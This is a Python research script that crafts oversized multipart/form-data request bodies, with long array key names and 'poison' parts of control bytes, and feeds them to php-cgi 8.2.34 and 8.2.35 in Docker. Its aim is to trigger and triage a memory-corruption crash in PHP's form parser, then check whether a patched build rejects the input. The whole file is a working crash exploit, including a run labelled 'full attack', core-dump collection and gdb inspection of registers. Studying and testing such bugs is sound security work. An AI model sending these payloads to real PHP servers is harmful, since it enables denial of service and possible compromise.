#!/usr/bin/env python3
"""oom44: settle [a] POSTCOUNT=0 (sanity vs poison-name rejection) and
[b] native core (cd /tmp first so core_pattern 'core' lands findable)."""
import subprocess
import sys

NAMELEN = 3064


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, poison, fill=b"\x08"):
    if fill:
        cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
        nm = b"q" + cell * ((poison - 10) // 16) + (b"%06d" % n)
    else:
        nm = b"q" + b"K" * (poison - 10) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build(k1=2044, prep=3, poison=163840, plain_poison=False, simple=False):
    if simple:
        ps = [key_part(i) for i in range(5)]
    else:
        ps = [key_part(i) for i in range(k1)]
        ps += [poison_part(n, poison, fill=None if plain_poison else b"\x08")
               for n in range(prep)]
        ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def docker(cid, cmd, timeout=590, inp=None):
    r = subprocess.run(["docker", "exec", cid, "sh", "-c", cmd],
                       input=inp, capture_output=True, timeout=timeout)
    return r.returncode, r.stdout.decode("latin1")


def fixed_count(body, lim="64000000"):
    docker("phpbuild35", "cat > /tmp/body35.bin", inp=body, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "/usr/src/php-8.2.35/sapi/cgi/php-cgi -d memory_limit=%s "
           "-d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/body35.bin >/tmp/o35.log 2>/tmp/e35.log; echo RC=$?") % (len(body), lim)
    rc, out = docker("phpbuild35", cmd)
    _, tail = docker("phpbuild35", "tail -2 /tmp/o35.log")
    return rc, out.strip(), tail.strip()[-60:]


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "both"

    if mode in ("fixed", "both"):
        print("=== [a1] sanity: 5 plain parts @64M ===", flush=True)
        print(fixed_count(build(simple=True)))
        print("=== [a2] pure climb, no poison @64M ===", flush=True)
        print(fixed_count(build(prep=0)))
        print("=== [a3] full attack, PLAIN-letter poison @64M ===", flush=True)
        print(fixed_count(build(plain_poison=True)), flush=True)

    if mode in ("core", "both"):
        print("=== [b] native core, cwd=/tmp ===", flush=True)
        docker("phpbuild", "cat > /tmp/body.bin", inp=build(), timeout=120)
        runcmd = ("cd /tmp && ulimit -c unlimited && "
                  "REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
                  "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
                  "/usr/src/php-8.2.34/sapi/cgi/php-cgi -d memory_limit=20600000 "
                  "-d post_max_size=4096M -d max_input_vars=100000 "
                  "</tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?; ls -la /tmp/core*") % len(build())
        rc, out = docker("phpbuild", runcmd)
        print(out)
        if "core" in out:
            _, bt = docker("phpbuild", "gdb -q -batch "
                           "-ex 'bt 10' -ex 'info registers rip rdi rsi' -ex 'x/2i \\$pc' "
                           "/usr/src/php-8.2.34/sapi/cgi/php-cgi /tmp/core* 2>&1 | tail -30")
            print(bt)
